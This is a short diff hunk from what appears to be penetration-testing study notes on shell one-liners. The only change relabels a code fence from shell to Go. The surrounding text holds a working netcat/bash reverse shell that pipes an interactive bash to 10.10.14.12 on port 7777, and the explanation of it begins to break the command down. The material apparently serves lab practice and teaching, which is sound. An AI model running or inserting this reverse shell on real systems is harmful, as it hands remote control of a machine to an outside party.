@@ -2,7 +2,7 @@
 Below are previously used one liners, explained in depth
 
 **Netcat/Bash Reverse Shell One-Liner**
-```shell-session
+```go
 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
 ```
 	- `rm -f /tmp/f` Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files
